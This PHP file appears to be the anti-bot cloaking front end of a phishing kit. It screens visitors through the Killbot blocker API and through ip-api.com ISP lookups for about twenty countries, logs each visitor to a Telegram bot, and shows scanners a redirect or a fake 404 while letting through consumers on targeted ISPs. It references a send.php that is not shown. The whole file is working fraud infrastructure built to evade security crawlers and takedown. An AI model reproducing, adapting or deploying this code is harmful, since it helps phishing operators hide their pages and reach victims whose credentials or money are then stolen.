<?php

require "global_config.php";
require "config_antibots.php";
if (!file_exists("/var/www/html/config_antibots.php") || !file_exists("/var/www/html/global_config.php") || !file_exists("/var/www/html/send.php")) {
    header("location: https://www.mediapart.fr/404");
    die;
}
$visitor_ip = $_SERVER["REMOTE_ADDR"];
$display = false;
function checkISP($list, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot)
{
    $i = 0;
    $result = false;
    while ($i < count($list)) {
        if (strpos(strtolower($org), strtolower($list[$i])) !== false) {
            $result = true;
            break;
        }
        $i++;
    }
    if ($result) {
        logBot(true, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot, false, $_SERVER["HTTP_USER_AGENT"]);
    }
    return $result;
}
class abt
{
    function apikey($api_key)
    {
        $this->apikey = $api_key;
    }
    function check()
    {
        $ip = $this->get_client_ip();
        $respons = $this->httpGet("https://killbot.org/api/v1/blocker?ip=" . $ip . "&apikey=" . $this->apikey . "&ua=" . urlencode($_SERVER["HTTP_USER_AGENT"]) . "&url=" . urldecode($_SERVER["REQUEST_URI"]));
        $json = json_decode($respons, true);
        if ($json["data"]["block_access"] == true) {
            return true;
        } else {
            return false;
        }
    }
    function get_client_ip()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER["HTTP_CLIENT_IP"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = @$_SERVER["HTTP_CLIENT_IP"];
        $forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
        $remote = $_SERVER["REMOTE_ADDR"];
        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        return $ip;
    }
    function httpGet($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Killbot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        $response = curl_exec($ch);
        return $response;
    }
}
$ip = $_SERVER["REMOTE_ADDR"];
if (strlen($test_ip) > 1) {
    $ip = $test_ip;
}
if ($_SERVER["REMOTE_ADDR"] == $whitelist_ip) {
    $display = true;
}
if ($_SERVER["REMOTE_ADDR"] != $whitelist_ip) {
    $abt = new abt();
    $abt->apikey($antibot_api_token);
    if ($antibot_activate_api == true && $abt->check() == true) {
        logBot(false, $ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot, true, $_SERVER["HTTP_USER_AGENT"]);
        die(header("location: " . $antibot_redirection_url));
    } else {
        if ($antibot_activate_isp) {
            function getIpInfo2($ip = '')
            {
                $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip);
                $ipinfo_json = json_decode($ipinfo, true);
                return $ipinfo_json;
            }
            $visitor_ip = $_SERVER["REMOTE_ADDR"];
            if (strlen($test_ip) > 1) {
                $visitor_ip = $test_ip;
            }
            $ipinfo_json = getIpInfo2($visitor_ip);
            if ($ipinfo_json["status"] != "fail") {
                $org = "{$ipinfo_json["as"]}";
                $isps = "{$ipinfo_json["isp"]}";
            } else {
                $org = "Introuvable";
                $isps = "Introuvable";
            }
            if ($display == false && $isp_italy_check == true) {
                $display = checkISP($isp_italy, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_austria_check == true) {
                $display = checkISP($isp_austria, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_swiss_check == true) {
                $display = checkISP($isp_swiss, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_netherlands_check == true) {
                $display = checkISP($isp_netherlands, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_deutschland_check == true) {
                $display = checkISP($isp_deutschland, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_danish_check == true) {
                $display = checkISP($isp_danish, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_sweden_check == true) {
                $display = checkISP($isp_sweden, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_canada_check == true) {
                $display = checkISP($isp_canada, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_france_check == true) {
                $display = checkISP($isp_france, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_hongrie_check == true) {
                $display = checkISP($isp_hongrie, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_portugal_check == true) {
                $display = checkISP($isp_portugal, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_luxembourg_check == true) {
                $display = checkISP($isp_luxembourg, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_spain_check == true) {
                $display = checkISP($isp_spain, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_ireland_check == true) {
                $display = checkISP($isp_ireland, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_UK_check == true) {
                $display = checkISP($isp_UK, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_belgium_check == true) {
                $display = checkISP($isp_belgium, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_usa_check == true) {
                $display = checkISP($isp_usa, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_uea_check == true) {
                $display = checkISP($isp_uea, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display == false && $isp_cz_check == true) {
                $display = checkISP($isp_cz, $org, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot);
            }
            if ($display != true) {
                logBot(false, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot, false, $_SERVER["HTTP_USER_AGENT"]);
                die("HTTP/1.0 404 Not Found");
            }
        }
    }
    if (!$antibot_activate_isp) {
        $display = true;
    }
    logBot(true, $visitor_ip, $telegram_bot_token_bot, $telegram_chat_id_bot, $log_bot, false, $_SERVER["HTTP_USER_AGENT"]);
}
